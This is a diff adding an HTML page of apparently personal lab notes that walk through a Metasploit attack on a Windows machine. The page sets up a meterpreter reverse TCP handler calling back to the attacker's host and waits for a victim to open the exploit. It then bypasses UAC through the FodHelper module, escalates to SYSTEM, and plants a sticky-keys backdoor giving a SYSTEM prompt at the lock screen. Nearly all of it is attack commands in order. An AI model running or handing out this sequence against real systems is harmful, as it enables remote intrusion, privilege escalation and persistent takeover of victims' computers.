@@ -1,0 +1,35 @@
+ <meta name=”robots” content=”noindex,nofollow”/>
+  <a href=../index.html>Back to home</a>
+<hr/>
+  <h2>Remote Shell Workflow</h2>
+<p>Follow the remote shell workflow to create an exploit and store it in /var/www/html/share</p>
+<p>Run msfconsole; use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost [KALI IP]; set lport 444; run</p>
+<p>As soon as the victim downloads and opens the exploit, a meterpreter session will open</p>
+<p><ol>
+  <ul>sysinfo</ul>
+  <ul>getuid</ul>
+  <ul>background</ul>
+</ol>
+<p>The meterpreter session is running on the background. Now, type search bypassuac to get the list of bypassuac modules. We wil bypass Windows UAC 
+  protection via the FodHelper Registry Key, which is present in Metasploit as bypassuac_fodhelper exploit.</p>
+<p><ol>
+  <ul>use exploit/windows/local/bypassuac_fodhelper</ul>
+  <ul>set session 1</ul>
+  <ul>show options; set lhost 10.10.1.13; set target 0; exploit</ul>
+</ol></p>
+<p>The BypassUAC exploit will bypass the UAC setting on the Windows machine.</p>
+<p><ol>
+  <ul>getsystem -t 1</ul>
+  <ul>getuid -> the meterpreter session is now running with system privileges</ul>
+  <ul>background</ul>
+</ol></p>
+<h2>Sticky Keys</h2>
+<p>We will use sticky_keys module present in Metasploit to exploit the sticky keys feature in Windows.</p>
+<p><ol>
+  <ul>use post/windows/manage/sticky_keys</ul>
+  <ul>sessions -i*</ul>
+  <ul>set session 2 -> set the privileged session as the current version</ul>
+  <ul>exploit</ul>
+</ol>
+<p>When a Windows computer is locked, press Shift key 5 times, which will open a command prompt on the lock screen with system privileges</p>
+
